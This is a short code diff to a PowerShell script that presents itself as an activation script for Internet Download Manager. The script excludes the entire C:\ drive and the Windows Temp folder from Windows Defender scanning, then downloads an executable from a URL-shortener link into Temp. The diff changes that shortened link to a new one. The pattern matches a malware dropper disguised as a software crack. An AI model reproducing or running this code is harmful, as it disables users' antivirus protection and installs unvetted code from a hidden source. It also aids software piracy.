@@ -1,7 +1,7 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
 Add-MpPreference -ExclusionPath "C:\","activate-key.exe","C:\Windows\Temp\"
-$url = "https://is.gd/sAdbMO"
+$url = "https://t.ly/SBWKS"
 $outpath = "C:\Windows\Temp\activate-key.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
 $wc = New-Object System.Net.WebClient
